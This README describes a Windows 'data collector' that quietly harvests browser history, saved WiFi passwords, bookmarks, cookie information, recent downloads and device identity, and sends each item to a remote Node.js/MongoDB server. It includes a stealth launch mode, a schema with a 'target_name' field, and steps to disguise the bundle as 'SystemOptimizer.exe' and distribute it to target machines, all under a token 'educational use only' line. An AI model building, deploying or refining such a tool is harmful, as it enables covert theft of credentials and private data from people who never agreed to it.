# Enhanced Data Collector - Backend Edition

## 🚀 Now Sends Data to MongoDB Atlas!

This version sends collected data **directly to your backend server** which stores it in MongoDB Atlas database.

---

## ⚙️ Setup

### 1. Configure Backend URL

Edit `launch.bat` line 16:
```batch
set "BACKEND_URL=http://YOUR_SERVER_IP:8080/api/data"
```

Replace `YOUR_SERVER_IP` with:
- Your server IP address (e.g., `192.168.0.101`)
- Or domain name (e.g., `yourdomain.com`)

### 2. Start Backend Server

On your server (macOS/Linux/Windows):
```bash
cd data_project/backend
npm start
```

Server will run on port 8080 and connect to MongoDB Atlas.

---

## 📊 Data Flow

```
Windows Collector
  ↓ Collects data
  ↓ Sends via HTTP POST (incremental)
  ↓
Backend API (Node.js + Express)
  ↓ Receives POST requests
  ↓ Validates & processes
  ↓
MongoDB Atlas
  ↓ Stores in database
  ↓
Dashboard (React - coming soon)
```

---

## 🎯 What It Collects & Sends

Each data type is sent **immediately** after collection:

1. ✅ **Device Info** → `/api/data` (session_id, hostname, username, IP)
2. ✅ **Chrome History** → `/api/data` (all entries)
3. ✅ **Brave History** → `/api/data` (all entries)
4. ✅ **Edge History** → `/api/data` (all entries)
5. ✅ **WiFi Passwords** → `/api/data` (all saved networks)
6. ✅ **System Info** → `/api/data` (OS, hardware, software)
7. ✅ **Bookmarks** → `/api/data` (Chrome, Brave, Edge)
8. ✅ **Cookies Info** → `/api/data` (counts only)
9. ✅ **Recent Files** → `/api/data` (last 50 from Downloads)

---

## 🚀 Usage

### Stealth Mode (No Terminal):
**Double-click:** `launch.vbs`

### Visible Mode (Shows Progress):
**Double-click:** `launch.bat`

---

## 💾 Backend API Endpoints

### Collector Endpoints:
- `POST /api/data` - Receive data from collector

### Dashboard Endpoints (for frontend):
- `GET /api/sessions` - List all sessions
- `GET /api/sessions/:session_id` - Get session details
- `PATCH /api/sessions/:session_id` - Update session (add target_name)
- `DELETE /api/sessions/:session_id` - Delete session

### Auth Endpoints:
- `POST /api/auth/setup` - Initial admin password setup
- `POST /api/auth/login` - Admin login
- `POST /api/auth/update` - Change admin password

---

## 🗄️ MongoDB Schema

```javascript
Session {
  session_id: "20251229_143522_x7k9m",
  target_name: null,  // Set by admin later
  device_info: {
    hostname: "DESKTOP-ABC123",
    username: "JohnDoe",
    ip_address: "192.168.1.105",
    timestamp: "12/29/2025 14:35:22"
  },
  status: "complete",  // or "partial"
  items_collected: ["device_info", "chrome", "brave", "wifi", "system", ...],
  data: {
    chrome_history: [...],
    brave_history: [...],
    edge_history: [...],
    wifi_passwords: [{network: "WiFi1", password: "pass123"}],
    system_info: {...},
    bookmarks: {...},
    cookies_info: {...},
    recent_files: [...]
  },
  created_at: "2025-12-29T14:35:22.000Z",
  updated_at: "2025-12-29T14:35:45.000Z"
}
```

---

## 🧪 Testing

### 1. Setup Admin Password:
```bash
curl -X POST http://localhost:8080/api/auth/setup \
  -H "Content-Type: application/json" \
  -d '{"password": "your_admin_password"}'
```

### 2. Run Collector on Windows

### 3. Check Backend Logs:
```
[NEW SESSION] 20251229_143522_x7k9m
Device: DESKTOP-ABC123 (JohnDoe)
IP: 192.168.1.105

[DATA RECEIVED] chrome - 1234 items
[DATA RECEIVED] brave - 567 items
[DATA RECEIVED] wifi - 5 items
[DATA RECEIVED] system - N/A items
...
```

### 4. Query Database:
```bash
curl http://localhost:8080/api/sessions
```

---

##  Benefits of Incremental Sending

✅ **Resilient** - If collector interrupted, partial data still saved  
✅ **Real-time** - See data arrive as it's collected  
✅ **Efficient** - Each piece sent immediately, no waiting  
✅ **Trackable** - Monitor collection progress in real-time

---

## 🔧 Requirements

- Windows 10/11
- Server with Node.js installed
- MongoDB Atlas account (free tier works)
- Network connectivity between collector and server

---

## 📦 Package with IExpress

After testing works:
1. Bundle `collector_enhanced_win` folder into single `.exe`
2. Name it `SystemOptimizer.exe`
3. Distribute to target machines

---

**Educational use only. Use with proper authorization.** 🎓
